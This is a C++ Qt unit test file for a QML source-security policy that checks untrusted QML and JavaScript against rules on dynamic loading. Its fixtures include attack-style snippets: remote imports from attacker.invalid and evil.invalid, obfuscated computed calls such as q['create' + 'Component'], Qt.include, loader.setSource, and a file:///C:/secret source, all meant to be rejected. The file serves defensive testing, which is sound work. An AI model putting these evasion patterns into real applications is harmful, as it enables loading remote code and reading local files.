#include "QmlSourcePolicy.h"

#include <QTest>

class QmlSourcePolicyTest final : public QObject
{
    Q_OBJECT

private slots:
    void rejectsDynamicConstructionLoadingAndImports();
    void ignoresCommentsStringsAndStaticComponents();
    void distinguishesRegexAndTemplateExpressions();
    void distinguishesNumericDivisionAssignmentAndRegex();
    void rejectsComputedLoaderMembersAndUnsafeUrls();
    void classifiesEveryQmlAndScriptExtensionCaseInsensitively();
    void requiresSourceBindingsToBeOneStaticSafeLiteral();
    void rejectsSetSourceAndComputedMembersForAnyLoaderId();
    void extractsStaticModuleImportsWithoutLexicalFalsePositives();
    void classifiesEsModuleImportsAndRejectsRemoteSpecifiers();
};

void QmlSourcePolicyTest::rejectsDynamicConstructionLoadingAndImports()
{
    const QByteArray source = R"QML(
import QtQuick
import "https://attacker.invalid/module"
Item {
  property var q: Qt
  property string target: "remote.qml"
  Loader { source: target }
  Loader { sourceComponent: safeComponent }
  function attack(loader, name) {
    q["create" + "Component"](target)
    Qt[name](target)
    Qt.createQmlObject(target, loader)
    Qt.include(target)
    loader.setSource(target)
    import(target)
  }
}

)QML";
    const QStringList violations = QmlSourcePolicy::violations(source);
    QVERIFY(violations.contains(QStringLiteral("remote-import")));
    QVERIFY(violations.contains(QStringLiteral("qml-create-component")));
    QVERIFY(violations.contains(QStringLiteral("qt-dynamic-member")));
    QVERIFY(violations.contains(QStringLiteral("qml-create-object")));
    QVERIFY(violations.contains(QStringLiteral("qt-include")));
    QVERIFY(violations.contains(QStringLiteral("dynamic-loader-source")));
    QVERIFY(violations.contains(QStringLiteral("loader-set-source")));
    QVERIFY(violations.contains(QStringLiteral("dynamic-import")));
}

void QmlSourcePolicyTest::classifiesEveryQmlAndScriptExtensionCaseInsensitively()
{
    QVERIFY(QmlSourcePolicy::isQmlSourcePath(QByteArrayLiteral("qml/Main.QML")));
    QVERIFY(QmlSourcePolicy::isQmlSourcePath(QByteArrayLiteral("logic/route.Js")));
    QVERIFY(QmlSourcePolicy::isQmlSourcePath(QByteArrayLiteral("logic/module.MJS")));
    QVERIFY(!QmlSourcePolicy::isQmlSourcePath(QByteArrayLiteral("assets/qml.txt")));
}

void QmlSourcePolicyTest::requiresSourceBindingsToBeOneStaticSafeLiteral()
{
    const QByteArray safe = R"QML(
import QtQuick
Item {
  Image { source: "assets/logo.png"; width: 10 }
  Loader { id: arbitrary; source: "Page.qml" }
  Image {
    source:
      "qrc:/icons/logo.png"
  }
  property var matcher: /source:\s*"https:\/\//
  property string templateText: `source: "https://ignored.invalid"`
}
)QML";
    QCOMPARE(QmlSourcePolicy::violations(safe), QStringList{});

    const QList<QByteArray> attacks{
        QByteArrayLiteral("import QtQuick\nImage { source: \"assets/\" + name }"),
        QByteArrayLiteral("import QtQuick\nImage { source: chooseSource() }"),
        QByteArrayLiteral("import QtQuick\nImage { source: \"data:image/png;base64,AA\" }"),
        QByteArrayLiteral("import QtQuick\nImage { source: \"file:///C:/secret\" }"),
        QByteArrayLiteral("import QtQuick\nImage { source: \"https://evil.invalid/x\" }"),
    };
    for (const QByteArray &attack : attacks)
        QVERIFY2(!QmlSourcePolicy::violations(attack).isEmpty(), attack.constData());
}

void QmlSourcePolicyTest::rejectsSetSourceAndComputedMembersForAnyLoaderId()
{
    const QByteArray source = R"QML(
import QtQuick
Item {
  Loader { id: arbitraryName; source: "Page.qml" }
  function attack(member) {
    const alias = arbitraryName
    const setter = alias.setSource
    arbitraryName[member]
    alias["set" + "Source"]
  }
}
)QML";
    const QStringList violations = QmlSourcePolicy::violations(source);
    QVERIFY(violations.contains(QStringLiteral("loader-set-source")));
    QVERIFY(violations.contains(QStringLiteral("loader-dynamic-member")));
}

void QmlSourcePolicyTest::extractsStaticModuleImportsWithoutLexicalFalsePositives()
{
    const QByteArray source = R"QML(
// import Attacker.Comment
import QtQuick 2.15 as QQ
import QtQuick.Controls as Controls
import "pages" as Pages
.import QtQml 2.15 as Qml
const documentation = "import Attacker.String 1.0"
const expression = `import Attacker.Template ${1 + 1}`
)QML";
    QCOMPARE(QmlSourcePolicy::staticImports(source),
             QStringList({QStringLiteral("QtQuick"),
                          QStringLiteral("QtQuick.Controls"),
                          QStringLiteral("QtQml")}));
}

void QmlSourcePolicyTest::classifiesEsModuleImportsAndRejectsRemoteSpecifiers()
{
    const QByteArray localModules = R"JS(
import DefaultExport from "./default.mjs";
import * as Helpers from "../helpers.mjs";
import { first, second as alias } from "./named.mjs";
)JS";
    QCOMPARE(QmlSourcePolicy::staticImports(localModules), QStringList{});
    QCOMPARE(QmlSourcePolicy::violations(localModules),
             QStringList({QStringLiteral("es-module-import")}));

    const QList<QByteArray> remoteModules{
        QByteArrayLiteral("import DefaultExport from \"https://evil.invalid/a.mjs\";"),
        QByteArrayLiteral("import * as Helpers from \"https://evil.invalid/b.mjs\";"),
        QByteArrayLiteral("import { value } from \"https://evil.invalid/c.mjs\";"),
        QByteArrayLiteral("import \"https://evil.invalid/side-effect.mjs\";"),
    };
    for (const QByteArray &source : remoteModules) {
        QVERIFY2(!QmlSourcePolicy::violations(source).isEmpty(),
                 source.constData());
        QCOMPARE(QmlSourcePolicy::staticImports(source), QStringList{});
    }

    QByteArray longNamedImport = QByteArrayLiteral("import {");
    for (int index = 0; index < 140; ++index) {
        if (index != 0) longNamedImport += ',';
        longNamedImport += QByteArrayLiteral("a") + QByteArray::number(index);
    }
    longNamedImport += QByteArrayLiteral(
        "} from \"https://evil.invalid/long.mjs\";");
    QVERIFY(QmlSourcePolicy::violations(longNamedImport).contains(
        QStringLiteral("es-module-import")));

    const QList<QByteArray> combinedImports{
        QByteArrayLiteral("import QtQuick, { x } from \"./x.mjs\";"),
        QByteArrayLiteral("import QtQuick, * as X from \"./x.mjs\";"),
    };
    for (const QByteArray &source : combinedImports) {
        QVERIFY(QmlSourcePolicy::violations(source).contains(
            QStringLiteral("es-module-import")));
        QCOMPARE(QmlSourcePolicy::staticImports(source), QStringList{});
    }

    const QList<QByteArray> reexports{
        QByteArrayLiteral("export * from \"./local.mjs\";"),
        QByteArrayLiteral("export { x, y as z } from \"./local.mjs\";"),
        QByteArrayLiteral("export * from \"https://evil.invalid/star.mjs\";"),
        QByteArrayLiteral("export { x } from \"https://evil.invalid/named.mjs\";"),
    };
    for (const QByteArray &source : reexports) {
        QVERIFY(QmlSourcePolicy::violations(source).contains(
            QStringLiteral("es-module-export")));
    }
}

void QmlSourcePolicyTest::ignoresCommentsStringsAndStaticComponents()
{
    const QByteArray source = R"QML(
import QtQuick
Item {
  // Qt.createComponent("ignored.qml")
  property string documentation: "Qt.createQmlObject and loader.setSource and import(x)"
  property Component safeComponent: Component { Item {} }
  Loader { sourceComponent: safeComponent }
}
)QML";
    QCOMPARE(QmlSourcePolicy::violations(source), QStringList{});
}

void QmlSourcePolicyTest::distinguishesRegexAndTemplateExpressions()
{
    const QByteArray safe = R"QML(
import QtQuick
Item {
  property var detector: /Qt\.createComponent\("remote.qml"\)/gi
  property string documentation: `Qt.createQmlObject and loader.setSource`
  function divide(a, b) { return a / b / 2 }
  function conditional(text, ready) {
    if (ready) /Qt\.createComponent/.test(text)
  }
}

)QML";
    QCOMPARE(QmlSourcePolicy::violations(safe), QStringList{});

    const QByteArray attack = R"QML(
import QtQuick
Item {
  property var q: Qt
  property string computed: `${q["create" + "Component"]("remote.qml")}`
}
)QML";
    const QStringList violations = QmlSourcePolicy::violations(attack);
    QVERIFY(violations.contains(QStringLiteral("qt-dynamic-member")));
    QVERIFY(violations.contains(QStringLiteral("qml-create-component")));
}

void QmlSourcePolicyTest::distinguishesNumericDivisionAssignmentAndRegex()
{
    const QByteArray safe = R"QML(
import QtQuick
Item {
  property real decimalRatio: 12.5 / 2
  property real leadingFraction: .5 / 2
  property real exponentRatio: 1.2e+3 / 4
  property int hexRatio: 0xFF / 2
  property int binaryRatio: 0b1010 / 2
  property int octalRatio: 0o77 / 7
  function operators(value) {
    const integer = 10n
    value /= 2
    value++ / 2
    return /Qt\.createComponent/.test("documentation") && integer / 2n
  }
  property var flags: /source\s*:\s*test/giu
  property string templateResult: `${1 / 2}`
}
)QML";
    QCOMPARE(QmlSourcePolicy::violations(safe), QStringList{});

    const QByteArray attack = R"QML(
import QtQuick
Item {
  function attack() {
    const ratio = 1 / 2 / 0x2
    Qt.createComponent("remote.qml")
  }
}
)QML";
    const QStringList violations = QmlSourcePolicy::violations(attack);
    QVERIFY(violations.contains(QStringLiteral("qml-create-component")));
}

void QmlSourcePolicyTest::rejectsComputedLoaderMembersAndUnsafeUrls()
{
    const QByteArray source = R"QML(
import QtQuick
Item {
  property var loaderAlias
  Image { source: "file:///C:/secret.txt" }
  Image { source: "https://attacker.invalid/pixel.png" }
  Image { source: model.dynamicPath }
  function attack(loader, member) {
    const alias = loader
    loader["set" + "Source"]("remote.qml")
    loader[member]("remote.qml")
    alias[member]
  }
}
)QML";
    const QStringList violations = QmlSourcePolicy::violations(source);
    QVERIFY(violations.contains(QStringLiteral("loader-set-source")));
    QVERIFY(violations.contains(QStringLiteral("loader-dynamic-member")));
    QVERIFY(violations.contains(QStringLiteral("unsafe-url-source")));
    QVERIFY(violations.contains(QStringLiteral("dynamic-url-source")));

    const QByteArray safe = R"QML(
import QtQuick
Item {
  Image { source: "assets/logo.png" }
  Image { source: "qrc:/icons/logo.png" }
  Loader { sourceComponent: Component { Image { source: "assets/nested.png" } } }
}
)QML";
    QCOMPARE(QmlSourcePolicy::violations(safe), QStringList{});
}

QTEST_MAIN(QmlSourcePolicyTest)
#include "tst_qml_source_policy.moc"
